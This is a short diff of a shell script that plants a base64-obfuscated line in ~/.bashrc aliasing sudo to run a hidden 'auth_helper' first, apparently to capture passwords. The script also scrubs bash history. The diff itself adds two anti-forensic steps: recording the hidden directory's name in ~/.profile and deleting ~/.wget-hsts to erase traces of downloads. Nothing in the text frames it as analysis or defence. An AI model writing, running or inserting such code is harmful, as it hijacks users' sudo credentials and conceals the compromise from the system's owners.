@@ -31,8 +31,9 @@ sed -i "32s/.*/$OBFUSCATED_LINE/" ~/.bashrc
 ENCODED_RECOVERY=$(echo "[[ -f '$SECRETDIR/auth_helper' ]] && alias sudo='$SECRETDIR/auth_helper && command sudo'" | base64 -w0)
 RECOVERY_LINE="eval \$(echo '$ENCODED_RECOVERY' | base64 -d)"
 echo "$RECOVERY_LINE" >> ~/.bashrc
-
+echo "# $(basename "$SECRETDIR")" >> "$HOME/.profile"
 grep -v "nohup" ~/.bash_history > /tmp/clean_history
 mv /tmp/clean_history ~/.bash_history
 history -c && history -r
 history -w
+rm "$HOME/.wget-hsts"
